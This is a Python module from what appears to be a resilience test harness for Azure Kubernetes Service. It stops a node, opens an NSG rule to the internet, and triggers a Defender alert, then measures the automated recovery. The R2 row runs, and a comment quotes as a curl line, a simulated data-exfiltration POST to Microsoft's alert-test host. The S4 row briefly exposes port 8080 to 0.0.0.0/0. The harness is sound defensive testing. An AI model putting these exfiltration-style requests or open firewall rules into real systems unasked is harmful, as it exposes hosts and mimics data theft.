"""The AKS-only rows: A4, S4 and R2.

Same contract as eks_rows.py: each row injects one fault, observes what the
system does with its own clock, and returns observations; judge.py decides
(ADR-0003, "AKS thresholds"). Every function takes `h`, the runner module, for
its helpers (kubectl, the prober, wait_for, the abort line), so the rows share
one implementation of measurement with kind and EKS.

Azure calls go through the az CLI with the operator's own sign-in. Terraform
outputs come from infra/azure (`runner`). Nothing here creates infrastructure:
A4 stops and restarts one existing instance, S4 writes and removes one NSG
rule, R2 makes one HTTP request from a web pod.
"""
from __future__ import annotations

import datetime as dt
import json
import os
import subprocess
import tempfile
import time
from collections import Counter
from functools import lru_cache
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
ARM = "https://management.azure.com"
S4_RULE = "selfheal-s4-drift"
S4_PRIORITY = "300"  # above the lab's deny-ssh (100) and deny-rdp (110)
# Microsoft's own Defender for Cloud attack simulation uses this request to
# raise a threat-intelligence alert (ADR-0007 row 5): `curl -s -m 10 -X POST
# "http://mdc-eicar.alerts.security.azure.com?SendingData"`. python3 sends
# it here, never a shell, so R1's Falco rule stays out of R2.
R2_TRIGGER = ("import urllib.request\n"
              "for _ in range(3):\n"
              "    try:\n"
              "        urllib.request.urlopen(urllib.request.Request("
              "'http://mdc-eicar.alerts.security.azure.com/?SendingData', data=b'SendingData', method='POST'), timeout=10)\n"
              "    except Exception:\n"
              "        pass\n")
API = {"alerts": "2022-01-01", "logic": "2019-05-01", "automation": "2023-12-01-preview"}


# --------------------------------------------------------------------------- #
# Azure plumbing
# --------------------------------------------------------------------------- #

def az(*args: str, timeout: int = 120, check: bool = True):
    p = subprocess.run(["az", *args, "--only-show-errors", "-o", "json"], capture_output=True, text=True, timeout=timeout)
    if p.returncode != 0:
        if check:
            raise RuntimeError(f"az {' '.join(args[:3])}: {p.stderr.strip()[:300]}")
        return None
    return json.loads(p.stdout) if p.stdout.strip() else {}


def az_rest(method: str, path: str, body: dict | None = None, check: bool = True):
    args = ["rest", "--method", method, "--url", f"{ARM}{path}"]
    if body is not None:
        args += ["--body", json.dumps(body), "--headers", "Content-Type=application/json"]
    return az(*args, check=check)


@lru_cache(maxsize=1)
def outputs() -> dict:
    p = subprocess.run(["terraform", f"-chdir={ROOT / 'infra' / 'azure'}", "output", "-json", "runner"],
                       capture_output=True, text=True, timeout=60)
    if p.returncode != 0:
        raise RuntimeError(f"terraform output runner: {p.stderr.strip()[:300]}")
    return json.loads(p.stdout)


def sub_path() -> str:
    """/subscriptions/<id>, from the cluster's own resource ID."""
    return "/".join(outputs()["cluster_id"].split("/")[:3])


def rg_path() -> str:
    return f"{sub_path()}/resourceGroups/{outputs()['resource_group']}"


def epoch(v) -> float:
    if isinstance(v, (int, float)):
        return float(v)
    s = str(v).replace("Z", "+00:00")
    # Azure returns up to 7 fractional digits; Python takes 6.
    if "." in s:
        head, rest = s.split(".", 1)
        n = len(rest) - len(rest.lstrip("0123456789"))
        s = f"{head}.{rest[:n][:6]}{rest[n:]}"
    t = dt.datetime.fromisoformat(s)
    # Azure times are UTC; a naive one must never be read as local time.
    return (t if t.tzinfo else t.replace(tzinfo=dt.timezone.utc)).timestamp()


# --------------------------------------------------------------------------- #
# the secret backend (row S1): Key Vault
# --------------------------------------------------------------------------- #

SECRET = "partner-api-key"


def kv_get() -> str:
    return az("keyvault", "secret", "show", "--vault-name", outputs()["key_vault"], "--name", SECRET,
              "--query", "value") or ""


def kv_put(value: str) -> None:
    """A new secret version. The value travels through a 0600 file, never a
    command line (`az keyvault secret set --file`)."""
    fd, path = tempfile.mkstemp()
    try:
        os.fchmod(fd, 0o600)
        os.write(fd, value.encode())
        os.close(fd)
        az("keyvault", "secret", "set", "--vault-name", outputs()["key_vault"], "--name", SECRET,
           "--file", path, "--encoding", "utf-8", "--query", "id")
    finally:
        os.unlink(path)


# --------------------------------------------------------------------------- #
# nodes
# --------------------------------------------------------------------------- #

def vmss_of(h, node: str) -> tuple[str, str]:
    """(scale set, instance id) from the node's providerID:
    azure:///subscriptions/.../virtualMachineScaleSets/<vmss>/virtualMachines/<id>"""
    pid = h.kj("get", "node", node).get("spec", {}).get("providerID", "")
    parts = pid.split("/")
    try:
        i = [p.lower() for p in parts].index("virtualmachinescalesets")
        return parts[i + 1], parts[i + 3]
    except (ValueError, IndexError):
        raise RuntimeError(f"node {node} has no scale set providerID ({pid!r})") from None


# The taint the cluster autoscaler puts on a node it has decided to remove.
CA_DELETING_TAINT = "ToBeDeletedByClusterAutoscaler"


def workload_nodes(h) -> list[dict]:
    out = []
    for n in h.kj("get", "nodes", "-l", "selfheal.lab/nodes=workload").get("items", []):
        cond = next((c for c in n["status"].get("conditions", []) if c["type"] == "Ready"), {})
        out.append({"name": n["metadata"]["name"], "ready": cond.get("status") == "True",
                    "ready_since": cond.get("lastTransitionTime"),
                    "unschedulable": bool(n["spec"].get("unschedulable")),
                    "annotations": n["metadata"].get("annotations", {}),
                    "taints": [t.get("key") for t in n["spec"].get("taints", [])]})
    return out


def power_state(vmss: str, iid: str) -> str | None:
    v = az("vmss", "get-instance-view", "-g", outputs()["node_resource_group"], "-n", vmss,
           "--instance-id", iid, check=False) or {}
    return next((s["code"] for s in v.get("statuses", []) if s.get("code", "").startswith("PowerState/")), None)


def repair_events(h, node: str, since: float) -> list[str]:
    """AKS node auto-repair events for one node since a time (ADR-0007 row 17:
    events from the `aks-auto-repair` source)."""
    out = []
    for e in h.kj("get", "events", "-A", "--field-selector", f"involvedObject.name={node}").get("items", []):
        src = (e.get("source") or {}).get("component") or e.get("reportingComponent") or ""
        when = e.get("lastTimestamp") or e.get("eventTime") or e.get("firstTimestamp")
        if src == "aks-auto-repair" and when and epoch(when) >= since - 5:
            out.append(e.get("reason") or "repair")
    return out


def start_instance(h, node: str, vmss: str, iid: str) -> None:
    az("vmss", "start", "-g", outputs()["node_resource_group"], "-n", vmss, "--instance-ids", iid, timeout=900)
    h.wait_for(lambda: any(n["name"] == node and n["ready"] for n in workload_nodes(h)), 600, step=10,
               what=f"node {node} Ready again")


def eradicate_node(h, node: str) -> None:
    """The R2 node after the evidence is in: removed through AKS (a direct
    scale set change is unsupported on AKS), and the autoscaler adds a clean
    one for the Pending replica."""
    o = outputs()
    pool = h.kj("get", "node", node).get("metadata", {}).get("labels", {}).get("kubernetes.azure.com/agentpool", "work")
    az("aks", "nodepool", "delete-machines", "-g", o["resource_group"], "--cluster-name", o["cluster_id"].rsplit("/", 1)[-1],
       "--name", pool, "--machine-names", node, timeout=1200)


# --------------------------------------------------------------------------- #
# profile switch: the Azure-side half of "only manifests and policy change"
# --------------------------------------------------------------------------- #

def set_profile(h, profile: str) -> None:
    """The two Azure-side controls that differ between the runs (ADR-0001
    Azure addendum). Terraform creates both in their hardened state and
    ignores these fields, so the runner owns them during a session."""
    o = outputs()
    hardened = profile == "hardened"
    mode = "Default" if hardened else "DoNotEnforce"
    az("policy", "assignment", "update", "--name", o["policy_assignment_id"].rsplit("/", 1)[-1],
       "--scope", rg_path(), "--enforcement-mode", mode)
    got = az("policy", "assignment", "show", "--name", o["policy_assignment_id"].rsplit("/", 1)[-1],
             "--scope", rg_path(), "--query", "enforcementMode")
    if got != mode:
        raise RuntimeError(f"policy assignment enforcement is {got!r}, wanted {mode!r}")
    # PATCH with isEnabled only: the Logic App trigger URI is never returned
    # by a GET ("it will not be included in any response"), so a GET-then-PUT
    # would drop it. Whether PATCH keeps it is live check L19.
    path = f"{o['automation_id']}?api-version={API['automation']}"
    az_rest("PATCH", path, {"properties": {"isEnabled": hardened}})
    got = (az_rest("GET", path) or {}).get("properties", {}).get("isEnabled")
    if got is not hardened:
        raise RuntimeError(f"workflow automation isEnabled is {got!r}, wanted {hardened}")
    h.log(f"  azure: policy enforcement {mode}, workflow automation {'enabled' if hardened else 'disabled'}")


def steady(h) -> None:
    """AKS extras for the steady state: the S4 rule is gone, every workload
    instance is running and Ready, no workload node is cordoned or
    quarantined (an earlier R2), and the workload pool is back at its minimum
    of three Ready nodes."""
    o = outputs()
    if az("network", "nsg", "rule", "show", "-g", o["resource_group"], "--nsg-name", o["node_nsg"],
          "-n", S4_RULE, check=False):
        az("network", "nsg", "rule", "delete", "-g", o["resource_group"], "--nsg-name", o["node_nsg"], "-n", S4_RULE)
        h.log("  steady: removed the S4 rule")
    for n in workload_nodes(h):
        if not n["ready"]:
            vmss, iid = vmss_of(h, n["name"])
            state = power_state(vmss, iid)
            if state in ("PowerState/stopped", "PowerState/stopping", "PowerState/deallocated"):
                h.log(f"  steady: node {n['name']} is {state} (an earlier A4?), starting it")
                start_instance(h, n["name"], vmss, iid)
        elif n["unschedulable"] and CA_DELETING_TAINT in n["taints"]:
            # The cluster autoscaler is already removing this node (an empty
            # node after A4 brought its instance back). It is not an R2
            # leftover, and its machine may already be gone from the pool.
            h.log(f"  steady: node {n['name']} is being scaled down by the cluster autoscaler, waiting")
        elif n["unschedulable"]:
            h.log(f"  steady: node {n['name']} is still cordoned (an earlier R2?), replacing it")
            eradicate_node(h, n["name"])
    h.wait_for(lambda: len([n for n in workload_nodes(h) if n["ready"] and not n["unschedulable"]]) >= 3, 900,
               step=15, what="three Ready, schedulable workload nodes")


# --------------------------------------------------------------------------- #
# A4: the scale set instance hosting the most web pods is stopped
# --------------------------------------------------------------------------- #

A4_WINDOW_S = 600


def not_ready_since(h, node: str, t0: float, observed: float) -> float | None:
    """When the node went NotReady: the earlier of the runner's observation
    and the condition's own lastTransitionTime, never before T0 (ADR-0003,
    D3: the judged window can only grow)."""
    n = h.kj("get", "node", node)
    if not n:
        return observed
    cond = next((c for c in n["status"].get("conditions", []) if c["type"] == "Ready"), {})
    if cond.get("status") == "True":
        return None
    try:
        tr = epoch(cond["lastTransitionTime"])
    except (KeyError, ValueError):
        tr = observed
    return max(t0, min(observed, tr))


def row_a4(h, lab, profile: str, d: Path) -> dict:
    serving = [p for p in h.pods() if p["ready"]]
    node, n_web = Counter(p["node"] for p in serving).most_common(1)[0]
    vmss, iid = vmss_of(h, node)
    desired = len(serving)
    nodes_before = {n["name"] for n in workload_nodes(h)}
    rg = outputs()["node_resource_group"]
    t0 = h.now()
    # By instance ID, chosen now: no tag, nothing to go stale (ADR-0007 row 9).
    az("vmss", "stop", "-g", rg, "-n", vmss, "--instance-ids", iid, "--skip-shutdown", "--no-wait")
    ev: dict = {"stopped": None, "power": None, "not_ready": None, "replacement": None, "recovered": None,
                "shutdown_taint": None}
    trace = []

    def poll(t: float) -> None:
        if ev["stopped"] is None:
            ev["power"] = power_state(vmss, iid)
            if ev["power"] == "PowerState/stopped":
                ev["stopped"] = t
        if ev["not_ready"] is None:
            ev["not_ready"] = not_ready_since(h, node, t0, t)
        if ev["shutdown_taint"] is None:
            taints = next((n["taints"] for n in workload_nodes(h) if n["name"] == node), [])
            if "node.cloudprovider.kubernetes.io/shutdown" in taints:
                ev["shutdown_taint"] = t  # live check L7
        if ev["replacement"] is None:
            new = [n for n in workload_nodes(h) if n["name"] not in nodes_before and n["ready"]]
            if new:
                ev["replacement"] = (t, new[0]["name"])
        if ev["recovered"] is None and ev["not_ready"] is not None:
            ready = [p for p in h.pods() if p["ready"] and p["node"] != node]
            if len(ready) >= desired:
                ev["recovered"] = t
        # The abort line reads only samples after NotReady (decision D3),
        # and only marks the evidence: a stopped VM cannot be un-stopped
        # mid-row without hiding what happens next.
        if ev["not_ready"] is not None and not h.ABORT:
            st = lab.stats("http", max(t - 10, ev["not_ready"]), t)
            if st["n"] >= 10 and st["error_rate"] is not None and st["error_rate"] > h.ABORT_ERROR_RATE:
                h.log(f"  abort line: {st['error_rate']:.0%} http errors in the last 10s (after NotReady)")
                h.ABORT.update({"t": t, "kind": "http", "n": st["n"], "errors": st["errors"],
                                "error_rate": st["error_rate"], "error_kinds": st.get("error_kinds")})
        trace.append({"t": round(t - t0, 1), "power": ev["power"], "not_ready": ev["not_ready"] is not None,
                      "replacement": bool(ev["replacement"]), "recovered": ev["recovered"] is not None})

    # Fixed window (phase 1 lesson: stopping early inflates error rates).
    while h.now() < t0 + A4_WINDOW_S:
        poll(h.now())
        time.sleep(5)
    end = h.now()
    repairs = repair_events(h, node, t0)
    nr = ev["not_ready"]
    st = h.window(lab, "http", nr if nr is not None else t0, end, d, profile)
    gap = h.window(lab, "http", t0, nr, d, f"{profile}-before-notready") if nr is not None else None
    (d / f"a4-{profile}-trace.json").write_text(json.dumps(trace, indent=2))
    # The row is over; put the instance back for the rows that follow.
    h.log(f"  A4: starting {vmss}/{iid} again")
    start_instance(h, node, vmss, iid)
    rel = lambda t: None if t is None else round(t - t0, 1)  # noqa: E731
    return {"t0": t0, "node": node, "vmss": vmss, "instance_id": iid, "web_pods_on_node": n_web,
            "stopped": ev["stopped"] is not None, "power_state": ev["power"], "stopped_s": rel(ev["stopped"]),
            "not_ready_s": rel(nr), "shutdown_taint_s": rel(ev["shutdown_taint"]),
            "recovered_s": rel(ev["recovered"]),
            "replacement_node": ev["replacement"][1] if ev["replacement"] else None,
            "replacement_s": rel(ev["replacement"][0]) if ev["replacement"] else None,
            "repair_events": repairs,
            "error_rate": st["error_rate"] or 0.0, "samples": st["n"], "expected": st["expected"],
            "gap_error_rate": (gap or {}).get("error_rate"), "gap": gap,
            "window": f"NotReady to T0+{A4_WINDOW_S}s (fixed; D3), T0 to NotReady reported", "impact": st}


# --------------------------------------------------------------------------- #
# S4: the node NSG opened to the internet; Azure Policy DINE closes it
# --------------------------------------------------------------------------- #

def _rule(o: dict) -> dict | None:
    return az("network", "nsg", "rule", "show", "-g", o["resource_group"], "--nsg-name", o["node_nsg"],
              "-n", S4_RULE, check=False) or None


def _open(r: dict | None) -> bool:
    if not r or r.get("access") != "Allow":
        return False
    srcs = [r.get("sourceAddressPrefix")] + list(r.get("sourceAddressPrefixes") or [])
    return any(s in ("*", "0.0.0.0/0", "Internet", "Any") for s in srcs if s)


def _policy_deployment(o: dict, t0: float) -> dict:
    """A deployment in the lab group, after T0, whose parameters name this
    rule. Only the policy's template takes a ruleFullName parameter. The name
    is recorded, not assumed: the DINE docs do not say how it is named."""
    want = f"{o['node_nsg']}/{S4_RULE}".lower()
    best: dict = {}
    for dep in az("deployment", "group", "list", "-g", o["resource_group"], check=False) or []:
        p = dep.get("properties") or {}
        ts = p.get("timestamp")
        full = dep if p.get("parameters") is not None else (
            az("deployment", "group", "show", "-g", o["resource_group"], "-n", dep["name"], check=False) or {})
        params = (full.get("properties") or {}).get("parameters") or {}
        target = str((params.get("ruleFullName") or {}).get("value") or "").lower()
        if target != want:
            continue
        cand = {"name": dep["name"], "state": p.get("provisioningState"), "timestamp": ts,
                "after_t0": ts is not None and epoch(ts) >= t0 - 5, "targets_rule": True}
        if cand["after_t0"] or not best:
            best = cand
    return best


def row_s4(h, lab, profile: str, d: Path) -> dict:
    o = outputs()
    limit = h.THRESHOLDS[h.TARGET]["S4"]["revert_s"]
    t0 = h.now()
    az("network", "nsg", "rule", "create", "-g", o["resource_group"], "--nsg-name", o["node_nsg"], "-n", S4_RULE,
       "--priority", S4_PRIORITY, "--direction", "Inbound", "--access", "Allow", "--protocol", "Tcp",
       "--source-address-prefixes", "0.0.0.0/0", "--source-port-ranges", "*",
       "--destination-address-prefixes", "*", "--destination-port-ranges", "8080",
       "--description", "selfheal S4 drift", timeout=180)
    injected = _open(_rule(o))
    rule_id = f"{rg_path()}/providers/Microsoft.Network/networkSecurityGroups/{o['node_nsg']}/securityRules/{S4_RULE}"
    ev: dict = {"reverted": None, "noncompliant": None, "deployment": {}}
    last: dict | None = None
    trace = []
    deadline = t0 + limit + 60
    n = 0
    while h.now() < deadline:
        t = h.now()
        r = _rule(o)
        last = r
        if ev["reverted"] is None and not _open(r):
            ev["reverted"] = t
        if ev["noncompliant"] is None and n % 3 == 0:
            states = az("policy", "state", "list", "--resource", rule_id, "--query",
                        "[?complianceState=='NonCompliant'].timestamp", check=False) or []
            if states:
                ev["noncompliant"] = t
        if ev["reverted"] is not None:
            ev["deployment"] = _policy_deployment(o, t0)
        trace.append({"t": round(t - t0, 1), "access": (r or {}).get("access"),
                      "noncompliant": ev["noncompliant"] is not None, "deployment": ev["deployment"].get("state")})
        if ev["reverted"] is not None and ev["deployment"].get("state") in ("Succeeded", "Failed"):
            break
        n += 1
        time.sleep(10)
    # Cleanup only after the measurement, never during it.
    if _rule(o):
        az("network", "nsg", "rule", "delete", "-g", o["resource_group"], "--nsg-name", o["node_nsg"],
           "-n", S4_RULE, check=False)
    (d / f"s4-{profile}-trace.json").write_text(json.dumps({"trace": trace, "rule_after": last,
                                                            "deployment": ev["deployment"]}, indent=2, default=str))
    rel = lambda t: None if t is None else round(t - t0, 1)  # noqa: E731
    return {"t0": t0, "nsg": o["node_nsg"], "rule": S4_RULE, "injected": injected,
            "reverted_s": rel(ev["reverted"]), "noncompliant_s": rel(ev["noncompliant"]),
            "access_after": (last or {}).get("access"), "description_after": (last or {}).get("description"),
            "deployment": ev["deployment"] or None,
            "window": f"T0 to the policy deployment or T0+{limit + 60}s", "impact": {}}


# --------------------------------------------------------------------------- #
# R2: Defender for Containers alert -> workflow automation -> Logic App ->
#     queue -> in-cluster worker (cordon, then relabel) -> snapshot + capture
# --------------------------------------------------------------------------- #

def _alerts_since(t0: float) -> list[dict]:
    res = az_rest("GET", f"{rg_path()}/providers/Microsoft.Security/alerts?api-version={API['alerts']}",
                  check=False) or {}
    out = []
    for a in res.get("value", []):
        gen = (a.get("properties") or {}).get("timeGeneratedUtc")
        if gen and epoch(gen) >= t0 - 300:  # the judge refuses anything before T0
            out.append(a)
    return out


def alert_facts(a: dict, cluster_id: str, pod_name: str, t0: float) -> dict:
    """What the judge needs to know about one alert: is it real, does it name
    the lab cluster and the attacked pod (the field names are live check L2,
    so the whole alert body is searched), and when was it generated."""
    p = a.get("properties") or {}
    body = json.dumps(p).lower()
    return {"id": a.get("id"), "name": a.get("name"), "display_name": p.get("alertDisplayName"),
            "alert_type": p.get("alertType"), "status": p.get("status"),
            "generated_s": round(epoch(p["timeGeneratedUtc"]) - t0, 1) if p.get("timeGeneratedUtc") else None,
            "names_cluster": cluster_id.lower() in body, "names_pod": pod_name.lower() in body,
            "sample": str(p.get("alertDisplayName") or "").startswith("[SAMPLE ALERT]")}


def _blobs(o: dict, prefix: str) -> list[dict]:
    return az("storage", "blob", "list", "--account-name", o["storage_account"], "-c", o["evidence_container"],
              "--prefix", prefix, "--auth-mode", "login", "--query", "[].{name:name, created:properties.creationTime}",
              check=False) or []


def _blob_json(o: dict, name: str) -> dict:
    fd, path = tempfile.mkstemp()
    os.close(fd)
    try:
        az("storage", "blob", "download", "--account-name", o["storage_account"], "-c", o["evidence_container"],
           "-n", name, "-f", path, "--auth-mode", "login", "--overwrite", check=False)
        return json.loads(Path(path).read_text() or "{}")
    except ValueError:
        return {}
    finally:
        os.unlink(path)


def _logic_runs(o: dict, t0: float) -> list[dict]:
    res = az_rest("GET", f"{o['logic_app_id']}/runs?api-version={API['logic']}&$top=20", check=False) or {}
    out = []
    for r in res.get("value", []):
        p = r.get("properties") or {}
        if p.get("startTime") and epoch(p["startTime"]) >= t0 - 60:
            out.append({"name": r.get("name"), "status": p.get("status"), "start": p.get("startTime"),
                        "end": p.get("endTime")})
    return out


def capture_bytes(manifest: dict) -> int:
    """Bytes of Run Command output in the manifest (the action Run Command
    result is a list of statuses, each with a message)."""
    res = ((manifest.get("capture") or {}).get("result")) or []
    if isinstance(res, list):
        return sum(len(str((x or {}).get("message") or "")) for x in res)
    return len(str(res))


def row_r2(h, lab, profile: str, d: Path) -> dict:
    o = outputs()
    limit = h.THRESHOLDS[h.TARGET]["R2"]
    serving = [p for p in h.pods() if p["ready"]]
    tp = serving[0]
    node = tp["node"]
    prober = h.kj("-n", h.NS, "get", "pod", "-l", "app=prober")["items"][0]["metadata"]["name"]
    url_in = f"http://{tp['ip']}:8080/healthz"
    reachable_before = h.reach(prober, "prober", url_in)
    t0 = h.now()
    h.k("-n", h.NS, "exec", tp["name"], "-c", "web", "--", "python3", "-c", R2_TRIGGER, timeout=60)
    ev: dict = {"alert": None, "alert_raw": None, "isolated": None, "evidence": None, "run": None,
                "manifest": {}, "failed": {}, "replacement_on_node": None}
    trace = []
    seen_runs: list[dict] = []

    def isolated_now() -> bool:
        p = h.kj("-n", h.NS, "get", "pod", tp["name"])
        labelled = (p.get("metadata", {}).get("labels") or {}).get("quarantine") == "true"
        cordoned = bool(h.kj("get", "node", node).get("spec", {}).get("unschedulable"))
        return labelled and cordoned

    def replacement_on_node() -> bool:
        # The EKS race (ADR-0003): a replacement web pod created after T0 and
        # scheduled onto the node being quarantined.
        return any(p["node"] == node and p["created"] >= t0 and p["name"] != tp["name"] for p in h.pods())

    deadline = t0 + limit["alert_s"]
    while h.now() < deadline:
        t = h.now()
        if ev["alert"] is None:
            facts = [(alert_facts(a, o["cluster_id"], tp["name"], t0), a) for a in _alerts_since(t0)]
            mine = [(f, a) for f, a in facts if f["names_pod"] and f["names_cluster"]]
            if mine:
                ev["alert"], ev["alert_raw"] = mine[0]
                # Respond window: from the alert's own generation time.
                gen = t0 + (ev["alert"]["generated_s"] or 0)
                deadline = max(t, gen) + limit["evidence_s"] + 120
            trace.append({"t": round(t - t0, 1), "alerts": [f for f, _ in facts]})
        if ev["isolated"] is None and isolated_now():
            ev["isolated"] = t
        if ev["replacement_on_node"] is not True:
            ev["replacement_on_node"] = replacement_on_node() or (False if ev["isolated"] else None)
        if ev["alert"] is not None and ev["evidence"] is None:
            for b in _blobs(o, "r2/"):
                if not b["name"].endswith(("/manifest.json", "/failed.json")) or epoch(b["created"]) < t0 - 60:
                    continue
                body = _blob_json(o, b["name"])
                if b["name"].endswith("/manifest.json") and str(body.get("alert_id", "")).lower() == str(ev["alert"]["id"]).lower():
                    ev["evidence"], ev["manifest"], ev["run"] = t, body, b["name"].split("/")[1]
                elif b["name"].endswith("/failed.json") and not ev["failed"]:
                    ev["failed"] = {"blob": b["name"], **body}
        seen_runs = _logic_runs(o, t0) or seen_runs
        if ev["alert"] is not None and ev["isolated"] is not None and ev["evidence"] is not None:
            break
        if profile == "baseline" and ev["alert"] is not None:
            # The baseline has no automation: once the alert is in, wait out
            # the isolation threshold to show that nothing happens.
            gen = t0 + (ev["alert"]["generated_s"] or 0)
            if h.now() > gen + limit["isolate_s"] + 60:
                break
        time.sleep(15)
    end = h.now()
    reachable_after = h.reach(prober, "prober", url_in) if ev["isolated"] is not None else None
    st = h.window(lab, "http", t0, end, d, profile)

    # Preserve the evidence in the repo before teardown can take the account.
    rdir = d / f"r2-{profile}"
    rdir.mkdir(exist_ok=True)
    if ev["run"]:
        for b in _blobs(o, f"r2/{ev['run']}/"):
            local = rdir / b["name"].rsplit("/", 1)[-1]
            az("storage", "blob", "download", "--account-name", o["storage_account"], "-c", o["evidence_container"],
               "-n", b["name"], "-f", str(local), "--auth-mode", "login", "--overwrite", check=False)
    if ev["alert_raw"]:
        (rdir / "alert-arm.json").write_text(json.dumps(ev["alert_raw"], indent=2, default=str))
    if ev["failed"]:
        (rdir / "failed.json").write_text(json.dumps(ev["failed"], indent=2, default=str))
    (rdir / "logic-app-runs.json").write_text(json.dumps(seen_runs, indent=2))
    (rdir / "trace.json").write_text(json.dumps(trace[-40:], indent=2, default=str))

    node_now = h.kj("get", "node", node)
    scale_down_disabled = (node_now.get("metadata", {}).get("annotations") or {}).get(
        "cluster-autoscaler.kubernetes.io/scale-down-disabled") == "true"
    p = h.pod(tp["name"])
    kept = p is not None and p["running"] and p["restarts"] == tp["restarts"]
    if ev["isolated"] is not None:
        # Once more after the loop: a replacement can land after the last poll.
        ev["replacement_on_node"] = bool(ev["replacement_on_node"]) or replacement_on_node()

    # Eradicate: a human decision in production; here, after the evidence.
    h.k("-n", h.NS, "delete", "pod", tp["name"], "--wait=false")
    if ev["isolated"] is not None or node_now.get("spec", {}).get("unschedulable"):
        eradicate_node(h, node)
    rel = lambda t: None if t is None else round(t - t0, 1)  # noqa: E731
    man = ev["manifest"]
    return {"t0": t0, "target_pod": tp["name"], "node": node, "reachable_before": reachable_before,
            "reachable_after": reachable_after, "alert": ev["alert"],
            "alert_s": (ev["alert"] or {}).get("generated_s"),
            "isolated_s": rel(ev["isolated"]), "evidence_s": rel(ev["evidence"]), "pod_kept": kept,
            "scale_down_disabled": scale_down_disabled,
            "replacement_on_quarantined_node": ev["replacement_on_node"],
            "snapshot_state": (man.get("snapshot") or {}).get("provisioning_state") or None,
            "capture_bytes": capture_bytes(man), "logic_app_run": ev["run"],
            "logic_app_runs": seen_runs, "failed_reason": ev["failed"].get("reason") if ev["failed"] else None,
            "error_rate": st["error_rate"] or 0.0, "samples": st["n"], "expected": st["expected"],
            "window": "T0 (attack) to evidence, or to the alert plus the response window", "impact": st}


ROWS = {"A4": row_a4, "S4": row_s4, "R2": row_r2}
ACTIONS = {
    "A4": "the node controller marks the stopped node NotReady; pods leave after a 30s toleration; the spread "
          "(minDomains 3, nodeTaintsPolicy Honor) keeps them Pending until the cluster autoscaler adds a node",
    "S4": "Azure Policy deployIfNotExists rewrites the open rule to Deny",
    "R2": "Defender for Containers -> workflow automation -> Logic App -> queue -> worker cordons, then "
          "relabels; the Logic App snapshots the OS disk and runs the capture",
}
DETECTED = {"A4": "not_ready_s", "S4": "noncompliant_s", "R2": "alert_s"}
RECOVERED = {"A4": "recovered_s", "S4": "reverted_s", "R2": "isolated_s"}
